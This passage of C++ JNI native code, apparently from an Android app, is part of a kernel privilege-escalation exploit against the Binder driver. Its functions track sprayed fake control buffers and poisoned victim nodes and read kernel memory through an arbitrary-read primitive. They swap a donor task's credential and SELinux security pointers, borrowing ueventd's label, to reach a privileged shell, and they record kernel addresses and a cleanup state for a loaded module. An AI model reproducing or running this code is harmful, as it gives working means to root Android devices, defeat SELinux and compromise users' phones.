    int donor_live_a_stage = donor_proof_valid
            ? donor_proof.donor_live_a_stage : 0;
    int donor_live_b_stage = donor_proof_valid
            ? donor_proof.donor_live_b_stage : 0;
    int donor_snapshot_stage = donor_proof_valid
            ? donor_proof.donor_snapshot_stage : 0;
    std::uint64_t donor_repair = donor_proof_valid
            ? donor_proof.donor_repair : UINT64_MAX;
    int donor_complete_samples = donor_proof_valid
            ? donor_proof.complete_samples : 0;
    bool donor_preexit_refs_valid = donor_proof_valid &&
            donor_proof.preexit_refs_valid;
    std::uint32_t donor_preexit_usage = donor_proof_valid
            ? donor_proof.preexit_usage : 0;

    int isolated_total = isolated_proof.total;
    int isolated_retired = isolated_proof.retired;
    int binder_controlled_unlinks = isolated_proof.controlled_unlinks;
    bool isolated_retirement_proved = isolated_proof.proved;
    bool inactive_spray_state = !g_fake_control_active &&
            g_fake_control_expected == 0;
    int poisoned_before = poisoned_control_count_locked();
    std::set<int> poisoned_victims;
    bool poison_attribution_valid =
            poisoned_control_victims_locked(&poisoned_victims);
    bool retained_read_state_valid = sequence_complete &&
            native_watchdog_record &&
            g_terminal_ctlbuf_repair_verified &&
            inactive_spray_state &&
            isolated_retirement_proved &&
            binder_controlled_unlinks == g_write_successes + 1 &&
            binder_controlled_unlinks == 7 &&
            isolated_proof.controlled_unlink_victims.count(0) == 1 &&
            poison_attribution_valid && poisoned_before == 7 &&
            poisoned_victims ==
                    isolated_proof.controlled_unlink_victims &&
            !g_raw_arbitrary_retained && g_raw_retained_worker == -1;
    int poisoned_released = retained_read_state_valid
            ? release_poisoned_control_locked() : -1;
    int retained_read_buffers = poisoned_control_count_locked();
    bool retained_read_released = retained_read_state_valid &&
            retained_read_buffers == 0 &&
            poisoned_released == poisoned_before;
    bool sprays_retired = retained_read_released &&
            !g_fake_control_active && g_fake_control_expected == 0 &&
            !g_raw_arbitrary_retained && g_raw_retained_worker == -1;
    record_stage("spray-retirement-pass");
    record_stage("fd-close-start");

    std::vector<int> epitem_fds;
    std::vector<int> file_probe_fds;
    std::vector<int> file_probe_epoll_fds;
    std::vector<int> fake_node_fds_to_close;
    int raw_reply_signal_fd = -1;
    {
        std::scoped_lock lock(
                g_epitem_mutex, g_fake_node_mutex,
                g_raw_reply_signal_mutex);
        epitem_fds.swap(g_epitem_fds);
        file_probe_fds.swap(g_file_probe_fds);
        file_probe_epoll_fds.swap(g_file_probe_epoll_fds);
        fake_node_fds_to_close.swap(g_fake_node_fds);
        std::swap(raw_reply_signal_fd, g_raw_reply_signal_fd);
    }

    std::set<int> unique_fds;
    bool detached_fds_valid = true;
    auto collect_fds = [&](const std::vector<int>& fds) {
        for (int fd : fds) {
            if (fd < 0 || !unique_fds.insert(fd).second) {
                detached_fds_valid = false;
            }
        }
    };
    collect_fds(epitem_fds);
    collect_fds(file_probe_fds);
    collect_fds(file_probe_epoll_fds);
    collect_fds(fake_node_fds_to_close);
    if (raw_reply_signal_fd >= 0 &&
        !unique_fds.insert(raw_reply_signal_fd).second) {
        detached_fds_valid = false;
    }
    bool detached_fds_closed = true;
    std::size_t close_index = 0;
    for (int fd : unique_fds) {
        bool checkpoint = close_index < 16 || close_index % 256 == 0;
        if (checkpoint) {
            record_stage("fd-close-attempt");
        }
        bool closed = close(fd) == 0;
        detached_fds_closed = closed && detached_fds_closed;
        if (checkpoint) {
            record_stage("fd-close-result");
        }
        ++close_index;
    }
    bool native_close_ok = detached_fds_valid && detached_fds_closed;
    g_selected_epoll_fd = -1;
    g_selected_epoll_watched_fd = -1;
    g_arb_file_fd = -1;
    g_arb_read_ready = false;

    int primitive_fds = 0;
    int fake_node_fds = 0;
    bool raw_reply_signal_retired = false;
    bool fd_retirement_quiescent = false;
    {
        std::scoped_lock lock(
                g_epitem_mutex, g_fake_node_mutex,
                g_raw_reply_signal_mutex);
        primitive_fds = static_cast<int>(g_epitem_fds.size() +
                g_file_probe_fds.size() +
                g_file_probe_epoll_fds.size());
        fake_node_fds = static_cast<int>(g_fake_node_fds.size());
        raw_reply_signal_retired = g_raw_reply_signal_fd == -1;
        fd_retirement_quiescent =
                g_terminal_fd_retirement_gate.load(
                        std::memory_order_acquire) &&
                primitive_fds == 0 && fake_node_fds == 0 &&
                raw_reply_signal_retired;
    }
    bool native_fds_retired = fd_retirement_quiescent && native_close_ok;
    record_stage("fd-retirement-pass");
    bool binder_objects_retired = credential_target_death &&
            isolated_retirement_proved && isolated_total == 64 &&
            isolated_retired == 64 && binder_controlled_unlinks == 7 &&
            raw_target_proof.retired && owner_proof.retired &&
            anchor_proof.retired;
    bool pass = sequence_complete && helper_retired &&
            credential_target_death &&
            donor_proof_valid && donor_proof_consumed &&
            donor_slots && donor_baseline &&
            donor_refs_retired &&
            donor_live_pre_snapshot_2 &&
            normalisation_uid && normalisation_gid &&
            final_shell_identity && watchdogs_retired &&
            sprays_retired && binder_objects_retired &&
            native_fds_retired;

    char state[8192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=terminal-cleanup outcome=%s"
            " reason=%s reboot_required=%d durable=1"
            " sequence_complete=%d required_writes=6"
            " successful_writes=%d internal_write_misses=%d"
            " used_victims=%d helper_pid=%d helper_probe=%d"
            " helper_probe_errno=%d helper_retired=%d"
            " helper_unlinked=%d helper_proc=0x%" PRIx64
            " helper_unlink_samples=%d"
            " helper_slots_restored=%d helper_refs_retired=%d"
            " donor_proof_sequence=%" PRIu64
            " donor_proof_valid=%d donor_proof_consumed=%d"
            " donor_live_before=%d donor_live_before_stage=%d"
            " donor_live_a_stage=%d donor_live_b_stage=%d"
            " donor_slots=%d donor_real_cred=0x%" PRIx64
            " donor_cred=0x%" PRIx64
            " donor_baseline=%d baseline_usage=%u observed_usage=%u"
            " donor_live_pre_snapshot_2=%d"
            " donor_live_pre_snapshot_2_stage=%d"
            " donor_snapshot_stage=%d donor_repair=0x%" PRIx64
            " donor_complete_samples=%d"
            " donor_preexit_refs_valid=%d donor_preexit_usage=%u"
            " preexit_refs_valid=%d preexit_usage=%u final_usage=%u"
            " preexit_delta=%d"
            " donor_refs_retired=%d collateral_restored=%d"
            " collateral_retired=0 collateral=0x0"
            " normalisation_uid=%d normalisation_gid=%d"
            " final_shell_identity=%d retained_read_buffers=%d"
            " watchdog_tid=%d joined=%d tid_gone=%d"
            " uid_result=%d gid_result=%d shell=%d"
            " ctlbuf_repaired=%d module_loaded=%d module_unloaded=%d"
            " module_finalised=%d finalise_proof=%d"
            " donor_frozen=%d donor_resumed=%d donor_resume_pid=%d"
            " donor_resume_result=%d donor_resume_errno=%d"
            " resume_magic=0x%" PRIx64 " resume_version=%u"
            " resume_size=%u resume_cookie_hi=0x%" PRIx64
            " resume_cookie_lo=0x%" PRIx64
            " resume_helper_task=0x%" PRIx64 " resume_helper_pid=%d"
            " resume_donor_task=0x%" PRIx64 " resume_donor_tgid=%d"
            " resume_signal=%d resume_before_state=0x%" PRIx64
            " resume_before_exit_state=0x%" PRIx64
            " resume_before_threads=%u resume_before_stopped=%u"
            " resume_after_state=0x%" PRIx64
            " resume_after_exit_state=0x%" PRIx64
            " resume_after_threads=%u resume_after_stopped=%u"
            " resume_stable_samples=%u resume_task_security=0x%" PRIx64
            " resume_task_security_word8=0x%" PRIx64
            " resume_inode_security=0x%" PRIx64
            " resume_inode_security_word8=0x%" PRIx64
            " resume_labels_restored=%u resume_resumed=%u"
            " resume_proof=%u resume_commit=0x%" PRIx64
            " host_donor_pid=%d host_donor_start_time=%s"
            " host_donor_tids=%s host_donor_states=%s"
            " host_donor_samples=%d"
            " credential_target_death=%d"
            " poisoned_sprays=%d spray_active=%d spray_expected=%d"
            " sprays_retired=%d binder_controlled_unlinks=%d"
            " binder_objects_retired=%d raw_target_pid=%d"
            " raw_target_probe=%d raw_target_probe_errno=%d"
            " raw_target_retired=%d owner_pid=%d owner_probe=%d"
            " owner_probe_errno=%d owner_retired=%d anchor_pid=%d"
            " anchor_probe=%d anchor_probe_errno=%d anchor_retired=%d"
            " isolated_total=%d"
            " isolated_retired=%d primitive_fds=%d fake_node_fds=%d"
            " native_fds_retired=%d watchdogs_retired=%d",
            pass ? "pass" : "reboot-required",
            pass ? "clean" : "incomplete",
            pass ? "none" : "cleanup-gate",
            pass ? 0 : 1, sequence_complete ? 1 : 0,
            g_write_successes, g_internal_write_misses,
            g_write_victims_used, g_credential_target_pid,
            helper_probe, helper_probe_errno,
            helper_retired ? 1 : 0, helper_unlinked ? 1 : 0,
            helper_proc, helper_unlink_samples,
            g_final_shell_cred_valid ? 1 : 0,
            g_final_shell_cred_valid && helper_retired ? 1 : 0,
            donor_proof_sequence, donor_proof_valid ? 1 : 0,
            donor_proof_consumed ? 1 : 0,
            donor_live_before ? 1 : 0, donor_live_before_stage,
            donor_live_a_stage, donor_live_b_stage,
            donor_slots ? 1 : 0, donor_real_cred, donor_cred,
            donor_baseline ? 1 : 0,
            donor_baseline_usage, observed_usage,
            donor_live_pre_snapshot_2 ? 1 : 0,
            donor_live_pre_snapshot_2_stage,
            donor_snapshot_stage, donor_repair,
            donor_complete_samples,
            donor_preexit_refs_valid ? 1 : 0,
            donor_preexit_usage,
            donor_preexit_refs_valid ? 1 : 0,
            donor_preexit_usage,
            observed_usage,
            donor_refs_retired ? 2 : -1,
            donor_refs_retired ? 1 : 0,
            g_terminal_ctlbuf_repair_verified ? 1 : 0,
            normalisation_uid ? 1 : 0,
            normalisation_gid ? 1 : 0,
            final_shell_identity ? 1 : 0,
            retained_read_buffers,
            watchdog_proof.watchdog_tid, watchdog_proof.joined,
            watchdog_proof.tid_gone, watchdog_proof.uid_result,
            watchdog_proof.gid_result, watchdog_proof.shell,
            watchdog_proof.ctlbuf_repaired,
            watchdog_proof.module_loaded,
            watchdog_proof.module_unloaded,
            watchdog_proof.module_finalised,
            watchdog_proof.finalise_proof,
            watchdog_proof.donor_frozen,
            watchdog_proof.donor_resumed,
            watchdog_proof.donor_resume_pid,
            watchdog_proof.donor_resume_result,
            watchdog_proof.donor_resume_errno,
            watchdog_proof.resume_record.magic,
            watchdog_proof.resume_record.version,
            watchdog_proof.resume_record.size,
            watchdog_proof.resume_record.cookie_hi,
            watchdog_proof.resume_record.cookie_lo,
            watchdog_proof.resume_record.helper_task,
            watchdog_proof.resume_record.helper_pid,
            watchdog_proof.resume_record.donor_task,
            watchdog_proof.resume_record.donor_tgid,
            watchdog_proof.resume_record.signal,
            watchdog_proof.resume_record.pre_state,
            watchdog_proof.resume_record.pre_exit_state,
            watchdog_proof.resume_record.pre_thread_count,
            watchdog_proof.resume_record.pre_stopped_count,
            watchdog_proof.resume_record.post_state,
            watchdog_proof.resume_record.post_exit_state,
            watchdog_proof.resume_record.post_thread_count,
            watchdog_proof.resume_record.post_stopped_count,
            watchdog_proof.resume_record.stable_samples,
            watchdog_proof.resume_record.task_security,
            watchdog_proof.resume_record.task_security_word8,
            watchdog_proof.resume_record.inode_security,
            watchdog_proof.resume_record.inode_security_word8,
            watchdog_proof.resume_record.labels_restored,
            watchdog_proof.resume_record.resumed,
            watchdog_proof.resume_record.proof,
            watchdog_proof.resume_record.commit,
            watchdog_proof.host_donor_pid,
            watchdog_proof.host_donor_start_time.c_str(),
            watchdog_proof.host_donor_tids.c_str(),
            watchdog_proof.host_donor_states.c_str(),
            watchdog_proof.host_donor_samples,
            credential_target_death ? 1 : 0,
            poisoned_control_count_locked(),
            g_fake_control_active ? 1 : 0, g_fake_control_expected,
            sprays_retired ? 1 : 0,
            binder_controlled_unlinks,
            binder_objects_retired ? 1 : 0,
            raw_target_proof.pid, raw_target_proof.probe,
            raw_target_proof.probe_errno,
            raw_target_proof.retired ? 1 : 0,
            owner_proof.pid, owner_proof.probe,
            owner_proof.probe_errno, owner_proof.retired ? 1 : 0,
            anchor_proof.pid, anchor_proof.probe,
            anchor_proof.probe_errno, anchor_proof.retired ? 1 : 0,
            isolated_total, isolated_retired,
            primitive_fds, fake_node_fds,
            native_fds_retired ? 1 : 0,
            watchdogs_retired ? 1 : 0);

    g_terminal_cleanup_result = state;
    std::string path = directory + "/terminal-cleanup.result";
    bool durable = write_text_file(path, g_terminal_cleanup_result);
    record_stage("result-written");
    int directory_fd = durable ? open(
            directory.c_str(), O_RDONLY | O_CLOEXEC | O_DIRECTORY) : -1;
    durable = directory_fd >= 0 && fsync(directory_fd) == 0;
    if (directory_fd >= 0) {
        durable = close(directory_fd) == 0 && durable;
    }
    if (!durable) {
        unlink(path.c_str());
        g_terminal_cleanup_result =
                "status=reboot-required stage=terminal-cleanup"
                " outcome=incomplete reboot_required=1"
                " reason=result-persist durable=0";
    }
    return environment->NewStringUTF(g_terminal_cleanup_result.c_str());
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_vandam_prism_NativeBridge_configureRawVictims(
        JNIEnv* environment, jclass, jlongArray pointers,
        jlongArray cookies, jint target_pid) {
    if (pointers == nullptr || cookies == nullptr ||
        environment->GetArrayLength(pointers) != kRawVictimCount ||
        environment->GetArrayLength(cookies) != kRawVictimCount ||
        target_pid <= 0) {
        return JNI_FALSE;
    }
    jlong pointer_values[kRawVictimCount] {};
    jlong cookie_values[kRawVictimCount] {};
    environment->GetLongArrayRegion(
            pointers, 0, kRawVictimCount, pointer_values);
    environment->GetLongArrayRegion(
            cookies, 0, kRawVictimCount, cookie_values);
    bool valid = !environment->ExceptionCheck();
    for (int index = 0; valid && index < kRawVictimCount; ++index) {
        valid = pointer_values[index] != 0 && cookie_values[index] != 0;
        g_raw_victim_pointers[index] =
                static_cast<std::uint64_t>(pointer_values[index]);
        g_raw_victim_cookies[index] =
                static_cast<std::uint64_t>(cookie_values[index]);
        if (index != 0) {
            g_raw_victim_nodes[index] = 0;
        }
    }
    valid = valid && kernel_pointer(g_raw_victim_nodes[0]);
    g_raw_target_pid = target_pid;
    g_raw_target_proc = 0;
    g_raw_victims_configured = valid;
    return valid ? JNI_TRUE : JNI_FALSE;
}

bool collect_terminal_ctlbuf_slots(
        std::vector<const FakeControlSlot*>* selected) {
    if (selected == nullptr) {
        return false;
    }
    selected->clear();
    bool valid = g_direct_terminal_cleanup;
    for (const auto& slot : g_fake_control_slots) {
        if (!slot.poisoned) {
            continue;
        }
        bool standard = slot.state.load(std::memory_order_acquire) == 2 &&
                !slot.rearm_requested.load(std::memory_order_acquire) &&
                slot.pair[0] >= 0 && slot.pair[1] >= 0 &&
                slot.rearm_pair[0] < 0 && slot.rearm_pair[1] < 0;
        bool canonical_original = slot.poison_victim == 0 &&
                g_raw_victim0_canonical_original && slot.state.load(
                        std::memory_order_acquire) == 4 &&
                slot.rearm_requested.load(std::memory_order_acquire) &&
                slot.pair[0] >= 0 && slot.pair[1] < 0 &&
                slot.rearm_pair[0] >= 0 && slot.rearm_pair[1] >= 0;
        valid = valid && slot.created && slot.tid > 0 &&
                (standard || canonical_original) &&
                slot.poison_victim >= 0 &&
                slot.poison_victim < kRawVictimCount &&
                kernel_pointer(g_raw_victim_nodes[slot.poison_victim]);
        selected->push_back(&slot);
    }
    std::sort(selected->begin(), selected->end(),
            [](const FakeControlSlot* left,
               const FakeControlSlot* right) {
                return left->poison_victim < right->poison_victim;
            });
    valid = valid && selected->size() == 7;
    for (std::size_t index = 1; valid && index < selected->size(); ++index) {
        valid = (*selected)[index - 1]->poison_victim !=
                (*selected)[index]->poison_victim &&
                (*selected)[index - 1]->tid != (*selected)[index]->tid &&
                g_raw_victim_nodes[(*selected)[index - 1]->poison_victim] !=
                g_raw_victim_nodes[(*selected)[index]->poison_victim];
    }
    return valid;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_terminalCtlbufManifest(
        JNIEnv* environment, jclass) {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    std::vector<const FakeControlSlot*> selected;
    bool valid = collect_terminal_ctlbuf_slots(&selected);

    char state[2048];
    int used = std::snprintf(state, sizeof(state),
            "status=%s stage=terminal-ctlbuf-manifest count=%zu tgid=%d",
            valid ? "pass" : "fail", selected.size(), getpid());
    for (std::size_t index = 0;
         used > 0 && static_cast<std::size_t>(used) < sizeof(state) &&
         index < selected.size(); ++index) {
        const auto* slot = selected[index];
        used += std::snprintf(state + used, sizeof(state) - used,
                " e%zu=%d/%d/0x%" PRIx64,
                index, slot->poison_victim, slot->tid,
                g_raw_victim_nodes[slot->poison_victim]);
    }
    if (used <= 0 || static_cast<std::size_t>(used) >= sizeof(state)) {
        return environment->NewStringUTF(
                "status=fail stage=terminal-ctlbuf-manifest reason=truncated");
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_terminalCtlbufRescuePlan(
        JNIEnv* environment, jclass, jstring nonce_string) {
    if (nonce_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-rescue-plan reason=nonce");
    }
    const char* nonce_chars = environment->GetStringUTFChars(
            nonce_string, nullptr);
    if (nonce_chars == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-rescue-plan reason=nonce");
    }
    std::string nonce(nonce_chars);
    environment->ReleaseStringUTFChars(nonce_string, nonce_chars);
    bool nonce_valid = nonce.size() == 32 && std::all_of(
            nonce.begin(), nonce.end(), [](char value) {
                return (value >= '0' && value <= '9') ||
                        (value >= 'a' && value <= 'f');
            });
    std::uint64_t resume_cookie_hi = 0;
    std::uint64_t resume_cookie_lo = 0;
    bool nonce_cookies = nonce_valid && parse_unsigned_long_field(
            "0x" + nonce.substr(0, 16), &resume_cookie_hi) &&
            parse_unsigned_long_field(
                    "0x" + nonce.substr(16), &resume_cookie_lo) &&
            (resume_cookie_hi != 0 || resume_cookie_lo != 0);
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    std::vector<const FakeControlSlot*> selected;
    bool profile_valid = g_terminal_ctlbuf_profile_valid &&
            !g_terminal_ctlbuf_repair_verified;
    bool sequence_valid = g_direct_write_step == 7 &&
            g_write_successes == 6;
    bool slots_valid = collect_terminal_ctlbuf_slots(&selected);
    bool donor_valid = sequence_valid && validate_terminal_swapped_donor();
    std::uint64_t module_label = 0;
    std::uint64_t module_collateral = 0;
    bool module_label_read = kernel_pointer(
                    g_terminal_memfd_inode_security_slot) &&
            reliable_read64(g_terminal_memfd_inode_security_slot,
                            &module_label);
    bool module_label_valid = module_label_read &&
            module_label == g_terminal_vendor_inode_security;
    bool module_collateral_read = kernel_pointer(
                    g_terminal_vendor_inode_security) &&
            reliable_read64(g_terminal_vendor_inode_security + 8,
                            &module_collateral);
    bool module_collateral_valid = module_collateral_read &&
            module_collateral == g_terminal_memfd_inode_security_slot;
    bool valid = nonce_cookies && profile_valid && sequence_valid &&
            slots_valid && donor_valid && module_label_valid &&
            module_collateral_valid &&
            g_terminal_watched_inode == g_terminal_reference_inode;
    if (!valid) {
        char failure[3072];
        int used = std::snprintf(failure, sizeof(failure),
                "status=fail stage=ctlbuf-rescue-plan reason=state"
                " nonce_valid=%d profile=%d sequence=%d slots=%d"
                " terminal=%d repair_verified=%d"
                " slot_count=%zu donor=%d label_read=%d label_valid=%d"
                " label=0x%" PRIx64 " label_expected=0x%" PRIx64
                " collateral_read=%d collateral_valid=%d"
                " collateral=0x%" PRIx64
                " collateral_expected=0x%" PRIx64,
                nonce_valid ? 1 : 0, profile_valid ? 1 : 0,
                sequence_valid ? 1 : 0, slots_valid ? 1 : 0,
                g_direct_terminal_cleanup ? 1 : 0,
                g_terminal_ctlbuf_repair_verified ? 1 : 0,
                selected.size(), donor_valid ? 1 : 0,
                module_label_read ? 1 : 0,
                module_label_valid ? 1 : 0,
                module_label, g_terminal_vendor_inode_security,
                module_collateral_read ? 1 : 0,
                module_collateral_valid ? 1 : 0,
                module_collateral,
                g_terminal_memfd_inode_security_slot);
        for (std::size_t index = 0;
             used > 0 && static_cast<std::size_t>(used) < sizeof(failure) &&
             index < selected.size(); ++index) {
            const FakeControlSlot* slot = selected[index];
            used += std::snprintf(
                    failure + used, sizeof(failure) - used,
                    " s%zu=%d/%d/%d/%d/%d/%d/%d/0x%" PRIx64,
                    index, slot->poison_victim, slot->tid,
                    slot->created ? 1 : 0,
                    slot->state.load(std::memory_order_acquire),
                    slot->rearm_requested.load(std::memory_order_acquire)
                            ? 1 : 0,
                    slot->pair[0], slot->pair[1],
                    slot->poison_victim >= 0 &&
                            slot->poison_victim < kRawVictimCount
                            ? g_raw_victim_nodes[slot->poison_victim] : 0);
        }
        if (used <= 0 || static_cast<std::size_t>(used) >= sizeof(failure)) {
            return environment->NewStringUTF(
                    "status=fail stage=ctlbuf-rescue-plan"
                    " reason=diagnostic-truncated");
        }
        return environment->NewStringUTF(failure);
    }
    {
        std::lock_guard<std::mutex> plan_lock(g_ctlbuf_rescue_plan_mutex);
        g_ctlbuf_finalise_plan = CtlbufFinalisePlan {};
        g_ctlbuf_finalise_plan.valid = true;
        g_ctlbuf_finalise_plan.helper_tid = g_credential_target_pid;
        g_ctlbuf_finalise_plan.helper_task = g_terminal_helper_task;
        g_ctlbuf_finalise_plan.donor_cred = g_security_target_cred;
        g_ctlbuf_finalise_plan.private_cred = g_private_cred;
        g_ctlbuf_finalise_plan.owner_task = g_terminal_owner_task;
        g_ctlbuf_finalise_plan.owner_pid = g_terminal_owner_pid;
        g_ctlbuf_finalise_plan.watched_fd = g_terminal_watched_fd;
        g_ctlbuf_finalise_plan.arbitrary_fd = g_terminal_arbitrary_fd;
        g_ctlbuf_finalise_plan.reference_fd = g_terminal_reference_fd;
        g_ctlbuf_finalise_plan.watched_file = g_terminal_watched_file;
        g_ctlbuf_finalise_plan.watched_inode = g_terminal_watched_inode;
        g_ctlbuf_finalise_plan.watched_fops = g_terminal_watched_fops;
        g_ctlbuf_finalise_plan.arbitrary_file = g_terminal_arbitrary_file;
        g_ctlbuf_finalise_plan.arbitrary_inode = g_terminal_arbitrary_inode;
        g_ctlbuf_finalise_plan.arbitrary_fops = g_terminal_arbitrary_fops;
        g_ctlbuf_finalise_plan.reference_file = g_terminal_reference_file;
        g_ctlbuf_finalise_plan.reference_inode = g_terminal_reference_inode;
        g_ctlbuf_finalise_plan.reference_fops = g_terminal_reference_fops;
        g_ctlbuf_finalise_plan.selected_epitem = g_terminal_selected_epitem;
        g_ctlbuf_finalise_plan.expected_fops = g_terminal_expected_fops;
        g_ctlbuf_finalise_plan.expected_count =
                g_terminal_expected_ep_links;
        g_ctlbuf_finalise_plan.donor_task = g_terminal_donor_task;
        g_ctlbuf_finalise_plan.donor_pid = g_terminal_donor_pid;
        g_ctlbuf_finalise_plan.donor_real_cred_slot =
                g_terminal_donor_real_cred_slot;
        g_ctlbuf_finalise_plan.donor_cred_slot = g_terminal_donor_cred_slot;
        g_ctlbuf_finalise_plan.donor_usage = g_terminal_donor_usage;
        std::copy(std::begin(g_terminal_donor_ids),
                  std::end(g_terminal_donor_ids),
                  std::begin(g_ctlbuf_finalise_plan.donor_ids));
        g_ctlbuf_finalise_plan.donor_caps = g_terminal_donor_caps;
        g_ctlbuf_finalise_plan.donor_sid = g_terminal_donor_sid;
        g_ctlbuf_finalise_plan.donor_security = g_terminal_donor_security;
        g_ctlbuf_finalise_plan.donor_security_original =
                g_security_target_blob;
        g_ctlbuf_finalise_plan.borrowed_task_security_word8 =
                g_terminal_ueventd_security_word8;
        g_ctlbuf_finalise_plan.inode_security_original =
                g_terminal_memfd_inode_security_original;
        g_ctlbuf_finalise_plan.borrowed_inode_security_word8 =
                g_terminal_vendor_inode_security_word8;
        g_ctlbuf_resume_cookie_hi = resume_cookie_hi;
        g_ctlbuf_resume_cookie_lo = resume_cookie_lo;
        std::memcpy(g_command_watchdog_nonce, nonce.data(), nonce.size());
        g_command_watchdog_nonce[nonce.size()] = '\0';
    }
    std::string tids;
    std::string nodes;
    for (std::size_t index = 0; index < selected.size(); ++index) {
        if (index != 0) {
            tids.push_back(',');
            nodes.push_back(',');
        }
        tids += std::to_string(selected[index]->tid);
        char node[32];
        std::snprintf(node, sizeof(node), "0x%" PRIx64,
                g_raw_victim_nodes[selected[index]->poison_victim]);
        nodes += node;
    }
    std::uint64_t kernel_base = kKernelLinkBase + g_profile_kernel_slide;
    char state[3072];
    int length = std::snprintf(state, sizeof(state),
            "status=pass stage=ctlbuf-rescue-plan nonce=%s"
            " module_sha256="
            "2b4e520b65f252c1c7a51c303f8bc228663f6804cbca00f2ebc6005c9a9f26f8"
            " params=tids=%s nodes=%s"
            " kernel_base=0x%" PRIx64
            " expected_tgid=%d helper_tid=%d"
            " helper_task=0x%" PRIx64
            " donor_cred=0x%" PRIx64
            " private_cred=0x%" PRIx64
            " donor_security_slot=0x%" PRIx64
            " donor_security_original=0x%" PRIx64
            " borrowed_task_security=0x%" PRIx64
            " borrowed_task_security_word8=0x%" PRIx64
            " inode_security_slot=0x%" PRIx64
            " inode_security_original=0x%" PRIx64
            " borrowed_inode_security=0x%" PRIx64
            " borrowed_inode_security_word8=0x%" PRIx64
            " owner_task=0x%" PRIx64 " owner_pid=%d"
            " watched_fd=%d arbitrary_fd=%d reference_fd=%d"
            " watched_file=0x%" PRIx64 " watched_inode=0x%" PRIx64
            " watched_fops=0x%" PRIx64
            " arbitrary_file=0x%" PRIx64 " arbitrary_inode=0x%" PRIx64
            " arbitrary_fops=0x%" PRIx64
            " reference_file=0x%" PRIx64 " reference_inode=0x%" PRIx64
            " reference_fops=0x%" PRIx64
            " selected_epitem=0x%" PRIx64
            " expected_fops=0x%" PRIx64
            " finalise_expected_count=%u"
            " donor_task=0x%" PRIx64 " donor_pid=%d"
            " donor_real_cred_slot=0x%" PRIx64
            " donor_cred_slot=0x%" PRIx64
            " donor_usage=%u"
            " donor_uid=%u donor_euid=%u donor_suid=%u donor_fsuid=%u"
            " donor_gid=%u donor_egid=%u donor_sgid=%u donor_fsgid=%u"
            " donor_caps=0x%" PRIx64 " donor_sid=%u"
            " donor_security=0x%" PRIx64,
            nonce.c_str(), tids.c_str(), nodes.c_str(), kernel_base,
            getpid(), g_credential_target_pid,
            g_terminal_helper_task,
            g_security_target_cred, g_private_cred,
            g_security_target_cred + kCredSecurityOffset,
            g_security_target_blob, g_terminal_ueventd_security,
            g_terminal_ueventd_security_word8,
            g_terminal_memfd_inode_security_slot,
            g_terminal_memfd_inode_security_original,
            g_terminal_vendor_inode_security,
            g_terminal_vendor_inode_security_word8,
            g_terminal_owner_task, g_terminal_owner_pid,
            g_terminal_watched_fd, g_terminal_arbitrary_fd,
            g_terminal_reference_fd, g_terminal_watched_file,
            g_terminal_watched_inode, g_terminal_watched_fops,
            g_terminal_arbitrary_file, g_terminal_arbitrary_inode,
            g_terminal_arbitrary_fops, g_terminal_reference_file,
            g_terminal_reference_inode, g_terminal_reference_fops,
            g_terminal_selected_epitem, g_terminal_expected_fops,
            g_terminal_expected_ep_links,
            g_terminal_donor_task, g_terminal_donor_pid,
            g_terminal_donor_real_cred_slot, g_terminal_donor_cred_slot,
            g_terminal_donor_usage, g_terminal_donor_ids[0],
            g_terminal_donor_ids[1], g_terminal_donor_ids[2],
            g_terminal_donor_ids[3], g_terminal_donor_ids[4],
            g_terminal_donor_ids[5], g_terminal_donor_ids[6],
            g_terminal_donor_ids[7], g_terminal_donor_caps,
            g_terminal_donor_sid, g_terminal_donor_security);
    if (length <= 0 || length >= static_cast<int>(sizeof(state))) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-rescue-plan reason=truncated");
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheRawVictimNode(
        JNIEnv* environment, jclass, jint victim) {
    std::uint64_t node = find_raw_victim_node(victim);
    bool pass = kernel_pointer(node);
    if (pass) {
        g_raw_victim_nodes[victim] = node;
    }
    char state[896];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-victim-cache victim=%d node=0x%" PRIx64
            " probe_file=0x%" PRIx64 " main_proc=0x%" PRIx64
            " target_proc=0x%" PRIx64 " file_offset=%d"
            " ref_nodes=%d target_handle=%d configured_pid=%d"
            " target_pid=%d proc_nodes=%d target_nodes=%d"
            " n0=0x%" PRIx64 "/0x%" PRIx64 "/0x%" PRIx64
            " n1=0x%" PRIx64 "/0x%" PRIx64 "/0x%" PRIx64
            " n2=0x%" PRIx64 "/0x%" PRIx64 "/0x%" PRIx64,
            pass ? "pass" : "fail", victim, node,
            g_last_binder_probe_file, g_last_main_binder_proc,
            g_last_target_binder_proc, g_last_binder_probe_marker_offset,
            g_last_binder_ref_nodes, g_raw_target_handle, g_raw_target_pid,
            g_last_target_pid,
            g_last_binder_proc_nodes, g_last_target_node_nodes,
            g_last_target_nodes[0], g_last_target_pointers[0],
            g_last_target_cookies[0], g_last_target_nodes[1],
            g_last_target_pointers[1], g_last_target_cookies[1],
            g_last_target_nodes[2], g_last_target_pointers[2],
            g_last_target_cookies[2]);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_signalDeferredExport(
        JNIEnv* environment, jclass) {
    char signal = '1';
    int poisoned = poisoned_control_count();
    bool signaled = false;
    {
        std::lock_guard<std::mutex> lock(g_raw_reply_signal_mutex);
        signaled = poisoned >= 1 && poisoned <= 2 &&
                g_raw_reply_signal_fd >= 0 &&
                pwrite(g_raw_reply_signal_fd, &signal, 1, 0) == 1;
    }
    return environment->NewStringUTF(
            signaled
                    ? "status=pass stage=deferred-export-signal"
                    : "status=fail stage=deferred-export-signal");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareReplacementDrain(
        JNIEnv* environment, jclass) {
    std::vector<std::uint8_t> payload = make_fake_node_payload(
            g_disclosed_node_address.load(), 0, 0, false);
    int prefilled = 0;
    bool prepared = prepare_fake_control_spray(
